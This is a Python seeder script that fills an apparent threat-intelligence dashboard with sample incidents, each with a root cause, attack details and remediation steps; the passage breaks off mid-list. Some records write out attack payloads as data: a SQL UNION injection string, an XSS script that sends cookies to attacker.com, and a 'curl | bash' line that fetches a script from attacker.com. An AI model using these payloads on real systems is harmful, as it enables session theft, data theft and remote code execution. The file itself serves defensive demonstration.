"""
ITAP — Database Seeder
Populates the database with realistic threat intelligence data
so the dashboard shows real live data from the backend.
"""
import asyncio
import uuid
import random
from datetime import datetime, timedelta

# Setup path
import sys, os
sys.path.insert(0, os.path.dirname(__file__))

from app.db.database import engine, async_session_factory, Base
from app.models.models import (
    Target, Scan, Threat, Incident, RemediationLog,
    SeverityLevel, ScanStatus, IncidentStatus
)

# Realistic threat data
TARGETS = [
    {"domain": "webapp.example.com", "ip": "203.0.113.42", "org": "TechCorp Inc."},
    {"domain": "api.financeapp.io", "ip": "198.51.100.17", "org": "FinanceApp Ltd."},
    {"domain": "portal.healthcare.org", "ip": "192.0.2.88", "org": "HealthCare Systems"},
    {"domain": "mail.enterprise.net", "ip": "203.0.113.99", "org": "Enterprise Networks"},
    {"domain": "cdn.mediahost.com", "ip": "198.51.100.55", "org": "MediaHost Global"},
    {"domain": "db.cloudstore.io", "ip": "192.0.2.201", "org": "CloudStore Services"},
]

THREAT_DATA = [
    {
        "title": "CVE-2024-21762: FortiOS RCE — Active Exploitation",
        "desc": "Critical out-of-bounds write in FortiOS SSL VPN. Actively exploited in the wild by APT groups. CVSS 9.8. Immediate patching required.",
        "severity": SeverityLevel.CRITICAL, "score": 9.8, "category": "Remote Code Execution",
        "tactic": "Initial Access", "technique_id": "T1190", "technique_name": "Exploit Public-Facing Application",
        "phase": "Initial Access", "country": "Russia", "lat": 55.75, "lon": 37.61,
        "root_cause": (
            "CVE-2024-21762 is an out-of-bounds write vulnerability in FortiOS SSL VPN web management interface. "
            "Root cause: FortiOS versions 7.2.0–7.2.6 and 7.0.0–7.0.13 fail to properly validate the size of "
            "HTTP request bodies before writing them to a fixed-size heap buffer. The device is publicly "
            "reachable on port 443 with no IP allowlisting, exposing the flaw directly to the internet."
        ),
        "affected_components": ["FortiOS SSL VPN (port 443)", "Web management interface", "Heap memory allocator"],
        "attack_vector_detail": (
            "Attacker sends a specially crafted HTTP POST request to the /remote/login endpoint. "
            "The oversized body overflows a heap buffer, overwriting adjacent heap metadata. "
            "By controlling the overflow content, the attacker hijacks a function pointer and "
            "achieves unauthenticated remote code execution as root on the FortiGate device."
        ),
        "remediation": [
            {"step": 1, "action": "Apply FortiOS patch immediately", "priority": "immediate",
             "detail": "Upgrade to FortiOS 7.2.7, 7.0.14, or 6.4.15. If patching is not immediately possible, disable SSL VPN or restrict access to trusted IPs only via local-in policy."},
            {"step": 2, "action": "Audit for indicators of compromise", "priority": "immediate",
             "detail": "Search logs for POST /remote/login requests with unusual body sizes. Check for new admin accounts, unexpected config changes, or outbound connections to unknown IPs."},
            {"step": 3, "action": "Enable FortiGuard IPS signature for CVE-2024-21762", "priority": "immediate",
             "detail": "Apply FortiGuard IPS signature FG-VD-24-021762 to detect and block exploit attempts in real-time."},
            {"step": 4, "action": "Restrict SSL VPN access to MFA-enrolled users", "priority": "short-term",
             "detail": "Enforce certificate-based authentication and TOTP MFA for all SSL VPN users. This prevents exploitation even if a future similar vulnerability exists."},
            {"step": 5, "action": "Implement network segmentation behind VPN", "priority": "long-term",
             "detail": "Ensure VPN-connected clients land in a restricted DMZ segment, not directly on the internal network. Apply least-privilege firewall rules per user group."},
        ],
    },
    {
        "title": "Lazarus Group C2 Beacon — DNS Tunneling Detected",
        "desc": "Encoded DNS queries to known Lazarus Group infrastructure. Beaconing pattern matches DPRK APT tradecraft. Exfiltration suspected.",
        "severity": SeverityLevel.CRITICAL, "score": 9.5, "category": "C2 Communication",
        "tactic": "Command and Control", "technique_id": "T1071", "technique_name": "Application Layer Protocol",
        "phase": "Command and Control", "country": "North Korea", "lat": 39.03, "lon": 125.75,
        "root_cause": (
            "An endpoint on the internal network is infected with a Lazarus Group implant (likely delivered "
            "via spearphishing). The malware uses DNS TXT record queries to encode C2 traffic, bypassing "
            "firewall rules that permit outbound DNS. DNS traffic is not inspected by current security controls, "
            "and the DNS resolver allows recursive queries to arbitrary external domains."
        ),
        "affected_components": ["Infected endpoint (Windows workstation)", "DNS resolver", "Outbound firewall (DNS port 53)"],
        "attack_vector_detail": (
            "The implant encodes commands and data as base64 subdomains queried against attacker-controlled "
            "authoritative DNS servers (e.g., cmd.aab32f.lazarusc2.example). The DNS resolver relays these "
            "queries to the internet, and responses contain encoded instructions. This creates a covert "
            "bi-directional channel tunneled through legitimate DNS traffic."
        ),
        "remediation": [
            {"step": 1, "action": "Isolate infected endpoints immediately", "priority": "immediate",
             "detail": "Identify all hosts generating anomalous DNS queries (high-entropy subdomains, TXT record lookups to unknown domains). Network-isolate them immediately for forensic imaging."},
            {"step": 2, "action": "Block C2 domains at DNS resolver and firewall", "priority": "immediate",
             "detail": "Add known Lazarus Group IOC domains to DNS sinkholes and firewall blocklists. Subscribe to CISA and ISACs for updated Lazarus IOC feeds."},
            {"step": 3, "action": "Deploy DNS inspection and RPZ filtering", "priority": "short-term",
             "detail": "Enable DNS Response Policy Zones (RPZ) on internal resolvers. Deploy Zeek or DNS-over-HTTPS inspection to detect high-entropy domain queries characteristic of DNS tunneling."},
            {"step": 4, "action": "Restrict outbound DNS to internal resolvers only", "priority": "short-term",
             "detail": "Block direct outbound port 53/TCP/UDP from all endpoints except designated DNS servers. This forces all DNS through inspectable infrastructure."},
            {"step": 5, "action": "Full incident response and threat hunt", "priority": "long-term",
             "detail": "Engage IR team. Hunt for lateral movement, credential harvesting, and persistence mechanisms. Assume breach — audit all privileged accounts and secrets."},
        ],
    },
    {
        "title": "SQL Injection on /api/v2/users — Data Breach Risk",
        "desc": "Automated SQLi attack targeting user authentication endpoint. UNION-based injection confirmed. 47K records potentially exposed.",
        "severity": SeverityLevel.CRITICAL, "score": 9.2, "category": "SQL Injection",
        "tactic": "Initial Access", "technique_id": "T1190", "technique_name": "Exploit Public-Facing Application",
        "phase": "Initial Access", "country": "China", "lat": 39.90, "lon": 116.40,
        "root_cause": (
            "The /api/v2/users endpoint constructs SQL queries using string concatenation of the 'username' "
            "POST parameter without parameterisation or input sanitisation. The backend uses a legacy PHP "
            "MySQL library that does not enforce prepared statements. The database account has SELECT "
            "privileges across all tables, amplifying the impact of any successful injection."
        ),
        "affected_components": ["/api/v2/users endpoint", "MySQL database (users, transactions, sessions tables)", "PHP backend (legacy mysql_ functions)"],
        "attack_vector_detail": (
            "Attacker sends POST request with username=' UNION SELECT username,password,email,NULL FROM users-- "
            "The server concatenates this into: SELECT * FROM users WHERE username='' UNION SELECT ... "
            "The database executes the UNION query, returning all user records in the HTTP response. "
            "With 47K records exposed, attacker extracts hashed passwords and emails for offline cracking."
        ),
        "remediation": [
            {"step": 1, "action": "Block malicious IPs and deploy WAF SQLi rules", "priority": "immediate",
             "detail": "Block source IPs at firewall. Enable SQLi detection WAF rules (OWASP CRS). Alert on UNION, ORDER BY, SLEEP() keywords in parameters."},
            {"step": 2, "action": "Parameterise all SQL queries immediately", "priority": "immediate",
             "detail": "Replace all string-concatenated SQL with PDO prepared statements (PHP) or parameterised queries. Prioritise authentication and search endpoints."},
            {"step": 3, "action": "Assess data breach scope and notify affected users", "priority": "immediate",
             "detail": "Determine which records were accessed. If PII was exposed, notify affected users and DPA within 72 hours per GDPR Article 33."},
            {"step": 4, "action": "Force password reset for all users", "priority": "short-term",
             "detail": "Invalidate all sessions. Force password reset. Re-hash passwords with bcrypt (cost 12) — existing hashes may be MD5/SHA-1."},
            {"step": 5, "action": "Implement DB least privilege and DAM", "priority": "long-term",
             "detail": "Web app DB user should only access tables it needs. Deploy Database Activity Monitoring to alert on bulk SELECT or schema enumeration queries."},
        ],
    },
    {
        "title": "Ransomware Pre-Deployment — Cobalt Strike Detected",
        "desc": "Cobalt Strike beacon identified on internal server. Lateral movement in progress. LockBit 3.0 deployment imminent based on TTPs.",
        "severity": SeverityLevel.CRITICAL, "score": 9.7, "category": "Ransomware",
        "tactic": "Execution", "technique_id": "T1059", "technique_name": "Command and Scripting Interpreter",
        "phase": "Execution", "country": "Russia", "lat": 59.93, "lon": 30.31,
        "root_cause": (
            "Initial access was obtained via a phishing email delivering a macro-enabled document. "
            "The macro executed a PowerShell cradle that downloaded a Cobalt Strike stageless beacon. "
            "The affected workstation had local admin rights and no EDR, allowing the beacon to persist "
            "via a scheduled task. Lateral movement was possible due to reused local administrator "
            "passwords across servers (no LAPS deployment)."
        ),
        "affected_components": ["Compromised workstation (initial foothold)", "Internal servers (lateral movement)", "Domain controller (credential access)", "Backup servers (pre-encryption targeting)"],
        "attack_vector_detail": (
            "Post-initial-access: Cobalt Strike beacon establishes HTTPS C2 to attacker infrastructure. "
            "Attacker uses Mimikatz to harvest NTLM hashes, then performs pass-the-hash lateral movement "
            "to additional servers. Backup systems and domain controllers are enumerated. "
            "LockBit 3.0 affiliate typically deploys ransomware after disabling VSS and backup agents, "
            "then encrypts all accessible drives simultaneously."
        ),
        "remediation": [
            {"step": 1, "action": "Isolate all affected systems from the network IMMEDIATELY", "priority": "immediate",
             "detail": "Pull network cables or block at switch level. Do NOT shut down — memory forensics may reveal encryption keys. Preserve state for IR team."},
            {"step": 2, "action": "Engage CSIRT and senior leadership", "priority": "immediate",
             "detail": "Activate incident response plan. Notify CISO, Legal, and Communications. Consider law enforcement notification. Do NOT pay ransom without legal consultation."},
            {"step": 3, "action": "Identify and block Cobalt Strike C2 infrastructure", "priority": "immediate",
             "detail": "Extract beacon config from memory dump to identify C2 server IPs/domains. Block at perimeter firewall. Share IOCs with threat intel community."},
            {"step": 4, "action": "Reset all credentials and deploy LAPS", "priority": "short-term",
             "detail": "Reset all domain and local account passwords. Deploy Microsoft LAPS to randomise local admin passwords per machine. Invalidate all Kerberos tickets (krbtgt reset x2)."},
            {"step": 5, "action": "Deploy EDR and rebuild affected systems from clean backups", "priority": "long-term",
             "detail": "Rebuild all compromised systems from known-good backups or clean images. Deploy EDR (CrowdStrike, SentinelOne) before reconnecting. Conduct post-incident review."},
        ],
    },
    {
        "title": "Spearphishing Campaign — CEO Impersonation",
        "desc": "Targeted phishing emails impersonating CEO sent to finance dept. Malicious .docm attachment with macro dropper. 3 users clicked.",
        "severity": SeverityLevel.HIGH, "score": 8.1, "category": "Phishing",
        "tactic": "Initial Access", "technique_id": "T1566", "technique_name": "Phishing",
        "phase": "Initial Access", "country": "Iran", "lat": 35.68, "lon": 51.38,
        "root_cause": (
            "Finance department users received emails from a spoofed CEO address (CEO name with different domain). "
            "Root cause: (1) DMARC policy is in 'p=none' monitoring mode — spoofed emails are delivered. "
            "(2) Email gateway did not sandbox the .docm attachment. (3) Macros are enabled by default "
            "on Finance workstations. (4) Security awareness training was last conducted 14 months ago."
        ),
        "affected_components": ["Email gateway (missing sandbox)", "Finance workstations (macros enabled)", "DMARC policy (p=none)", "3 user accounts (clicked)"],
        "attack_vector_detail": (
            "Attacker registered a lookalike domain (ceo-name@company-corp.com vs company.com). "
            "Email purported to be an urgent wire transfer approval with .docm attachment. "
            "On open, macro executed mshta.exe to download and run a PowerShell payload. "
            "3 users executed the macro; EDR was not present on Finance workstations."
        ),
        "remediation": [
            {"step": 1, "action": "Isolate the 3 affected workstations", "priority": "immediate",
             "detail": "Network-isolate workstations of users who clicked. Conduct memory and disk forensics to determine if any payload executed successfully."},
            {"step": 2, "action": "Set DMARC to p=reject", "priority": "immediate",
             "detail": "Upgrade DMARC policy from p=none to p=reject for the primary domain. This prevents spoofed emails from reaching recipients."},
            {"step": 3, "action": "Disable macros via Group Policy", "priority": "immediate",
             "detail": "Deploy GPO to disable VBA macros in Office applications for all users, especially Finance. Enable Attack Surface Reduction (ASR) rules in Defender."},
            {"step": 4, "action": "Deploy email sandboxing and impersonation protection", "priority": "short-term",
             "detail": "Enable Microsoft Defender for Office 365 (or equivalent) with anti-impersonation, safe attachments, and safe links policies."},
            {"step": 5, "action": "Mandatory phishing simulation and awareness training", "priority": "long-term",
             "detail": "Run quarterly phishing simulations targeting Finance and HR. Mandatory security awareness training. Implement a 'report phishing' button in email clients."},
        ],
    },
    {
        "title": "CVE-2024-3094: XZ Utils Backdoor — Supply Chain",
        "desc": "Compromised XZ Utils version detected on 3 servers. Backdoor allows SSH authentication bypass. Nation-state supply chain attack.",
        "severity": SeverityLevel.HIGH, "score": 8.8, "category": "Supply Chain Attack",
        "tactic": "Persistence", "technique_id": "T1543", "technique_name": "Create or Modify System Process",
        "phase": "Persistence", "country": "Unknown", "lat": 52.52, "lon": 13.40,
        "root_cause": (
            "XZ Utils versions 5.6.0 and 5.6.1 contain a malicious backdoor injected by a compromised "
            "maintainer account (JiaT75) over a two-year social engineering campaign. The backdoor modifies "
            "the RSA_public_decrypt function in OpenSSH via a shared library hook, allowing an attacker with "
            "a specific private key to bypass SSH authentication. 3 servers updated to the backdoored version "
            "via the distribution's package manager before the backdoor was discovered."
        ),
        "affected_components": ["XZ Utils 5.6.0/5.6.1 (liblzma)", "OpenSSH daemon (via liblzma hook)", "3 production servers (Debian/Ubuntu unstable)"],
        "attack_vector_detail": (
            "Attacker with the corresponding Ed448 private key can send a specially crafted SSH2_MSG_USERAUTH_REQUEST "
            "packet. The backdoored liblzma intercepts the packet before OpenSSH validates it, authenticates the "
            "attacker directly, and grants shell access — bypassing all authentication controls including keys and passwords."
        ),
        "remediation": [
            {"step": 1, "action": "Downgrade XZ Utils immediately on all affected servers", "priority": "immediate",
             "detail": "Downgrade to xz-utils 5.4.x on all affected systems: apt install --allow-downgrades xz-utils=5.4.5-0.3. Restart sshd after downgrade."},
            {"step": 2, "action": "Audit SSH access logs for unauthorised sessions", "priority": "immediate",
             "detail": "Review /var/log/auth.log for SSH sessions during the window the backdoored version was installed. Look for sessions with no corresponding authentication key."},
            {"step": 3, "action": "Rotate all SSH host keys on affected servers", "priority": "short-term",
             "detail": "Regenerate SSH host keys (ssh-keygen -A). Update known_hosts on all clients. Rotate all SSH private keys stored on affected servers."},
            {"step": 4, "action": "Implement software supply chain integrity checks", "priority": "short-term",
             "detail": "Deploy Sigstore/cosign or in-toto attestation for all package installations. Use package pinning with hash verification in deployment pipelines."},
            {"step": 5, "action": "Establish dependency audit process", "priority": "long-term",
             "detail": "Subscribe to supply-chain security feeds (OpenSSF Scorecard, SLSA). Implement automated SCA scanning. Review all open-source maintainer activity for critical dependencies."},
        ],
    },
    {
        "title": "Brute Force SSH — 12K Attempts in 1 Hour",
        "desc": "Massive credential stuffing attack on SSH port 22. Source botnet spans 847 unique IPs. Rate: 200 attempts/minute.",
        "severity": SeverityLevel.HIGH, "score": 7.5, "category": "Brute Force",
        "tactic": "Credential Access", "technique_id": "T1110", "technique_name": "Brute Force",
        "phase": "Credential Access", "country": "Brazil", "lat": -23.55, "lon": -46.63,
        "root_cause": (
            "SSH port 22 is publicly reachable with no IP allowlisting. The server accepts password "
            "authentication in addition to key-based auth. No fail2ban or rate-limiting is configured. "
            "Some accounts use weak or leaked passwords (found in HaveIBeenPwned breach databases). "
            "The attacking botnet uses credential lists from previous breaches for targeted stuffing."
        ),
        "affected_components": ["SSH daemon (port 22, public)", "Password authentication (enabled)", "User accounts (weak passwords)", "Firewall (no rate limiting on port 22)"],
        "attack_vector_detail": (
            "Botnet (847 IPs, distributed across residential proxies) sends SSH auth requests at ~200/min. "
            "Credential list contains username:password pairs from prior breaches. If any account matches, "
            "attacker gains shell access. Even if unsuccessful, the attack consumes server resources and "
            "generates noise masking other attacks."
        ),
        "remediation": [
            {"step": 1, "action": "Block attacking IPs and enable fail2ban", "priority": "immediate",
             "detail": "Import attacking IP list into firewall blocklist. Configure fail2ban with maxretry=3 and bantime=86400 for SSH. Rate-limit new SSH connections to 3/min per IP at iptables level."},
            {"step": 2, "action": "Disable password authentication for SSH", "priority": "immediate",
             "detail": "Set PasswordAuthentication no in /etc/ssh/sshd_config. Restart sshd. Ensure all legitimate users have SSH keys configured before making this change."},
            {"step": 3, "action": "Move SSH to a non-standard port or restrict to VPN", "priority": "short-term",
             "detail": "Either change SSH to a high port (>1024) to reduce automated scanning, or require VPN connection before SSH access is permitted. Remove SSH from public internet entirely where possible."},
            {"step": 4, "action": "Audit all user accounts for weak passwords", "priority": "short-term",
             "detail": "Run john/hashcat against /etc/shadow. Force reset for any weak/breached passwords. Remove unused accounts. Enforce minimum 16-character passwords."},
            {"step": 5, "action": "Implement SSH certificate authentication with CA", "priority": "long-term",
             "detail": "Deploy an internal SSH Certificate Authority (HashiCorp Vault SSH secrets engine). Issue time-limited certificates instead of static keys for all SSH access."},
        ],
    },
    {
        "title": "Privilege Escalation via Kernel Exploit — CVE-2024-1086",
        "desc": "Linux kernel use-after-free in nf_tables. Local attacker achieved root. Detected via anomalous syscall pattern.",
        "severity": SeverityLevel.HIGH, "score": 7.8, "category": "Privilege Escalation",
        "tactic": "Privilege Escalation", "technique_id": "T1068", "technique_name": "Exploitation for Privilege Escalation",
        "phase": "Privilege Escalation", "country": "Germany", "lat": 52.52, "lon": 13.40,
        "root_cause": (
            "CVE-2024-1086 is a use-after-free vulnerability in the Linux kernel's nf_tables component "
            "(netfilter). Kernels 5.14–6.6 are affected. An unprivileged local user can exploit the "
            "freed memory to overwrite kernel function pointers. The server runs kernel 6.4.0 without "
            "the patch. An attacker who gained low-privilege access (e.g., via a web shell) then used "
            "this exploit to escalate to root."
        ),
        "affected_components": ["Linux kernel 6.4.0 (nf_tables module)", "netfilter subsystem", "Any process running as non-root with network namespace access"],
        "attack_vector_detail": (
            "Attacker creates a new user namespace and manipulates nf_tables expressions to trigger the "
            "use-after-free. By carefully crafting heap layout with Dirty Pipe-style techniques, attacker "
            "overwrites a kernel function pointer to redirect execution to shellcode in user space. "
            "Result: root shell obtained from any unprivileged local user account."
        ),
        "remediation": [
            {"step": 1, "action": "Apply kernel patch immediately", "priority": "immediate",
             "detail": "Update to kernel >= 6.6.14 or apply the CVE-2024-1086 patch for your distribution. Ubuntu: apt update && apt dist-upgrade. RHEL: yum update kernel."},
            {"step": 2, "action": "Disable unprivileged user namespaces as mitigation", "priority": "immediate",
             "detail": "sysctl kernel.unprivileged_userns_clone=0 (Debian/Ubuntu) or sysctl user.max_user_namespaces=0 (RHEL). This breaks the exploit primitive while you patch."},
            {"step": 3, "action": "Audit the compromised system for persistence", "priority": "immediate",
             "detail": "The attacker had root — assume full compromise. Audit crontabs, /etc/init.d, systemd units, authorized_keys, and SUID binaries for backdoors."},
            {"step": 4, "action": "Enable kernel lockdown and SELinux/AppArmor", "priority": "short-term",
             "detail": "Enable kernel lockdown mode (lockdown=confidentiality). Enforce SELinux or AppArmor policies to confine web application processes."},
            {"step": 5, "action": "Implement automated kernel patching pipeline", "priority": "long-term",
             "detail": "Deploy RHEL RHSA/Ubuntu USN subscriptions with automated patching for critical kernel CVEs. Target < 24h patch deployment for CVSS >= 8.0 kernel vulnerabilities."},
        ],
    },
    {
        "title": "Data Exfiltration — 2.3GB via HTTPS to Cloud Storage",
        "desc": "Anomalous outbound HTTPS traffic to external cloud endpoint. Volume: 2.3GB in 45 minutes. Pattern matches staged exfil.",
        "severity": SeverityLevel.HIGH, "score": 8.4, "category": "Data Exfiltration",
        "tactic": "Exfiltration", "technique_id": "T1567", "technique_name": "Exfiltration Over Web Service",
        "phase": "Exfiltration", "country": "United States", "lat": 37.77, "lon": -122.41,
        "root_cause": (
            "A compromised internal server (likely post-privilege-escalation) is uploading data to a "
            "cloud storage bucket (AWS S3 or similar) controlled by the attacker. No egress DLP is "
            "deployed. HTTPS traffic to cloud providers is not inspected (TLS inspection disabled for "
            "cloud destinations). The exfiltration volume (2.3GB in 45 min = ~680 Mbps bursts) was not "
            "caught by the SIEM because no baseline exists for this server's egress traffic."
        ),
        "affected_components": ["Compromised internal server", "Egress firewall (no DLP)", "TLS inspection bypass (cloud destinations)", "SIEM (no egress baseline alerting)"],
        "attack_vector_detail": (
            "Attacker used AWS CLI or curl to PUT data to a pre-created attacker-controlled S3 bucket "
            "over HTTPS (port 443). Traffic blends with legitimate cloud traffic. Data was likely staged "
            "locally first (compressed/encrypted archive) then uploaded in multi-part chunks to avoid "
            "triggering per-connection size alerts."
        ),
        "remediation": [
            {"step": 1, "action": "Block egress to unknown cloud endpoints immediately", "priority": "immediate",
             "detail": "Identify destination IPs/domains from firewall logs. Block at perimeter. If S3: block access to attacker bucket ARN via AWS Organization SCP."},
            {"step": 2, "action": "Isolate the source server for forensic analysis", "priority": "immediate",
             "detail": "Capture memory and disk image of the exfiltrating server. Determine what data was staged and transferred. Initiate data breach notification process."},
            {"step": 3, "action": "Deploy egress DLP and traffic analysis", "priority": "short-term",
             "detail": "Deploy CASB (Cloud Access Security Broker) to inspect and control traffic to cloud storage services. Enable DLP scanning for sensitive data patterns (PII, card data)."},
            {"step": 4, "action": "Implement TLS inspection for cloud-bound traffic", "priority": "short-term",
             "detail": "Enable TLS decryption for traffic to cloud storage providers at the proxy/NGFW level. This allows content inspection and DLP enforcement."},
            {"step": 5, "action": "Establish network behaviour baselines and alerting", "priority": "long-term",
             "detail": "Implement UBA/NTA to detect anomalous egress volumes per host. Alert on any server exceeding 1GB outbound in 1 hour without a prior change ticket."},
        ],
    },
    {
        "title": "XSS Stored — Admin Panel Compromise",
        "desc": "Persistent XSS injected into admin dashboard comment field. Session tokens of 5 admin users harvested.",
        "severity": SeverityLevel.MEDIUM, "score": 6.1, "category": "Cross-Site Scripting",
        "tactic": "Initial Access", "technique_id": "T1190", "technique_name": "Exploit Public-Facing Application",
        "phase": "Initial Access", "country": "India", "lat": 19.07, "lon": 72.87,
        "root_cause": (
            "The admin dashboard comment field stores user input to the database and renders it back "
            "without HTML entity encoding. No Content-Security-Policy header is set. The application "
            "framework (Django 3.x) has auto-escaping disabled for this template block due to a "
            "developer using the |safe filter incorrectly. Admin session cookies lack HttpOnly flag."
        ),
        "affected_components": ["Admin dashboard comment field", "Django template (|safe filter misuse)", "Session cookies (no HttpOnly)", "CSP header (missing)"],
        "attack_vector_detail": (
            "Attacker submitted a comment containing <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>. "
            "When admin users view the comments page, their browser executes the script. "
            "Session tokens are exfiltrated to the attacker's server. Attacker replays the tokens "
            "to gain admin access without credentials."
        ),
        "remediation": [
            {"step": 1, "action": "Sanitise or delete injected XSS payloads from database", "priority": "immediate",
             "detail": "Search comments table for script tags. Remove or escape malicious content. Invalidate all admin sessions immediately."},
            {"step": 2, "action": "Fix Django template — remove |safe from untrusted fields", "priority": "immediate",
             "detail": "Remove |safe filter from any template rendering user-supplied content. Django's default auto-escaping is correct — do not override it."},
            {"step": 3, "action": "Deploy Content-Security-Policy header", "priority": "short-term",
             "detail": "Add CSP: default-src 'self'; script-src 'self' 'nonce-{{nonce}}'. This prevents inline/external script execution even if XSS payloads exist."},
            {"step": 4, "action": "Set HttpOnly and Secure flags on session cookies", "priority": "short-term",
             "detail": "In Django settings: SESSION_COOKIE_HTTPONLY = True, SESSION_COOKIE_SECURE = True, SESSION_COOKIE_SAMESITE = 'Strict'."},
            {"step": 5, "action": "Integrate DAST XSS scanning in CI/CD", "priority": "long-term",
             "detail": "Run OWASP ZAP active scan against staging on every PR. Add SAST rule to flag |safe usage on user-supplied fields in code review."},
        ],
    },
    {
        "title": "Cryptominer Deployed — XMRig on Web Server",
        "desc": "Cryptocurrency miner consuming 90% CPU on production web server. Deployed via compromised Jenkins instance.",
        "severity": SeverityLevel.MEDIUM, "score": 5.8, "category": "Resource Hijacking",
        "tactic": "Impact", "technique_id": "T1496", "technique_name": "Resource Hijacking",
        "phase": "Impact", "country": "Romania", "lat": 44.43, "lon": 26.10,
        "root_cause": (
            "The Jenkins CI/CD server was accessible on port 8080 without authentication (no reverse proxy, "
            "no firewall rule). An attacker accessed Jenkins, created a malicious pipeline job that executed "
            "a shell script downloading and running XMRig (Monero miner) on the production web server via "
            "Jenkins' build agent. Jenkins had SSH agent access to production servers."
        ),
        "affected_components": ["Jenkins CI server (unauthenticated, port 8080 public)", "Production web server (Jenkins build agent)", "Jenkins pipeline (malicious job injected)"],
        "attack_vector_detail": (
            "Attacker accessed Jenkins at http://jenkins.company.com:8080 with no login. "
            "Created a 'Freestyle Project' with shell build step: curl -sL http://attacker.com/setup.sh | bash. "
            "The script downloaded XMRig binary, set up as a systemd service named 'systemd-journal', "
            "and connected to a Monero mining pool. CPU usage immediately spiked to 90%."
        ),
        "remediation": [
            {"step": 1, "action": "Kill the miner process and remove persistence", "priority": "immediate",
             "detail": "Kill XMRig process (pkill xmrig). Disable and delete the malicious systemd service. Delete the binary and any cron jobs related to the miner."},
            {"step": 2, "action": "Revoke Jenkins SSH agent access to production", "priority": "immediate",
             "detail": "Remove Jenkins' SSH key from production servers' authorized_keys immediately. Review and restrict all Jenkins agent credentials."},
            {"step": 3, "action": "Secure Jenkins with authentication and firewall", "priority": "immediate",
             "detail": "Enable Jenkins security realm (Matrix-based or LDAP). Place Jenkins behind a reverse proxy (nginx) with authentication. Block port 8080 at firewall for all external IPs."},
            {"step": 4, "action": "Audit all Jenkins jobs for malicious steps", "priority": "short-term",
             "detail": "Review all pipeline jobs and freestyle projects for unexpected shell commands. Implement Jenkins Pipeline shared library approval workflow."},
            {"step": 5, "action": "Segregate CI/CD from production network", "priority": "long-term",
             "detail": "CI/CD should not have direct SSH access to production. Deploy via artefact promotion through staging with manual approval gates. Use deployment keys with write-only access."},
        ],
    },
    {
        "title": "DDoS Attack — 45Gbps Volumetric Flood",
        "desc": "UDP amplification attack peaking at 45Gbps. Origin: Mirai botnet variant. Affecting CDN edge nodes.",
        "severity": SeverityLevel.MEDIUM, "score": 6.5, "category": "Denial of Service",
        "tactic": "Impact", "technique_id": "T1498", "technique_name": "Network Denial of Service",
        "phase": "Impact", "country": "Vietnam", "lat": 21.02, "lon": 105.83,
        "root_cause": (
            "The target IP is directly exposed without DDoS mitigation upstream. "
            "Amplification is enabled by open UDP-based reflectors (NTP servers with monlist enabled, "
            "open DNS resolvers, Memcached on port 11211) that multiply the attack volume by 556x (NTP). "
            "The CDN edge nodes lack automatic traffic scrubbing for volumetric attacks exceeding 10Gbps."
        ),
        "affected_components": ["CDN edge nodes (upstream bandwidth exceeded)", "NTP reflectors (monlist enabled)", "DNS open resolvers", "Origin server (reachable directly)"],
        "attack_vector_detail": (
            "Mirai botnet sends spoofed UDP packets to NTP servers with monlist requests, spoofing "
            "the source IP as the target. NTP servers respond to the target with large responses "
            "(amplification factor: 556x). Combined volume from thousands of bots reaches 45Gbps, "
            "saturating CDN edge uplinks and causing packet loss for legitimate users."
        ),
        "remediation": [
            {"step": 1, "action": "Enable upstream DDoS scrubbing immediately", "priority": "immediate",
             "detail": "Activate Cloudflare Magic Transit, AWS Shield Advanced, or Akamai Prolexic. Route all traffic through scrubbing centre. This should absorb the 45Gbps attack."},
            {"step": 2, "action": "Null-route or blackhole the target IP temporarily", "priority": "immediate",
             "detail": "Work with upstream ISP to apply BGP blackholing (RTBH) for the target IP to protect infrastructure while scrubbing is enabled."},
            {"step": 3, "action": "Disable NTP monlist and close open DNS resolvers", "priority": "short-term",
             "detail": "Disable NTP monlist: restrict noquery in /etc/ntp.conf. Configure DNS resolvers to only serve internal clients. This removes amplification vectors."},
            {"step": 4, "action": "Hide origin IP behind CDN/proxy", "priority": "short-term",
             "detail": "Ensure the origin server IP is not discoverable via DNS history, email headers, or SSL certificates. All traffic must flow through DDoS-protected edge."},
            {"step": 5, "action": "Implement autoscaling and BGP anycast", "priority": "long-term",
             "detail": "Deploy BGP anycast for the service across multiple PoPs globally. Distribute attack traffic geographically. Implement auto-scaling to absorb volumetric peaks."},
        ],
    },
    {
        "title": "Suspicious DNS Queries — Possible DGA Activity",
        "desc": "Machine-generated domain names detected in DNS logs. Pattern consistent with Domain Generation Algorithm malware.",
        "severity": SeverityLevel.MEDIUM, "score": 5.5, "category": "Suspicious Activity",
        "tactic": "Command and Control", "technique_id": "T1568", "technique_name": "Dynamic Resolution",
        "phase": "Command and Control", "country": "Ukraine", "lat": 50.45, "lon": 30.52,
        "root_cause": (
            "An endpoint is infected with malware that uses a Domain Generation Algorithm (DGA) to "
            "identify its C2 server. DGA malware generates hundreds of pseudo-random domain names "
            "daily; the attacker pre-registers one of them. The infected machine queries all generated "
            "domains until it gets an A record response, establishing C2 contact. "
            "DNS traffic from endpoints is not inspected for DGA patterns."
        ),
        "affected_components": ["Infected endpoint (DGA malware)", "Internal DNS resolver", "DNS logs (high-entropy domains)"],
        "attack_vector_detail": (
            "The malware generates domain names using a seeded algorithm (date + hardcoded key). "
            "It queries each domain; most return NXDOMAIN. The one registered by the attacker "
            "returns a valid IP — this becomes the C2 server. Communication proceeds via "
            "normal HTTP/HTTPS to the resolved IP, making blocking by domain infeasible without "
            "DGA detection."
        ),
        "remediation": [
            {"step": 1, "action": "Identify and isolate the infected endpoint", "priority": "immediate",
             "detail": "Identify the source host from DNS logs (highest NXDOMAIN rate). Isolate from network. Capture memory dump for malware family identification."},
            {"step": 2, "action": "Deploy DNS RPZ with DGA detection", "priority": "short-term",
             "detail": "Implement Cisco Umbrella, Infoblox BloxOne, or Pi-hole with threat feeds that block known DGA families. Deploy ML-based DGA detection (e.g., PDNS analysis)."},
            {"step": 3, "action": "Block DNS to external resolvers, route through internal sinkhole", "priority": "short-term",
             "detail": "Force all DNS through internal resolver. Sinkhole NXDOMAIN responses for DGA-pattern domains. Alert on any endpoint exceeding 50 NXDOMAIN responses per hour."},
            {"step": 4, "action": "Identify malware family and remove from all endpoints", "priority": "short-term",
             "detail": "Use memory dump + VirusTotal/sandbox to identify malware family. Run EDR-based threat hunt for the same malware across all endpoints."},
            {"step": 5, "action": "Implement endpoint DNS logging pipeline", "priority": "long-term",
             "detail": "Stream all endpoint DNS queries to SIEM. Build DGA detection model (high entropy, high NXDOMAIN rate, alphabetic patterns) for automated alerting."},
        ],
    },
    {
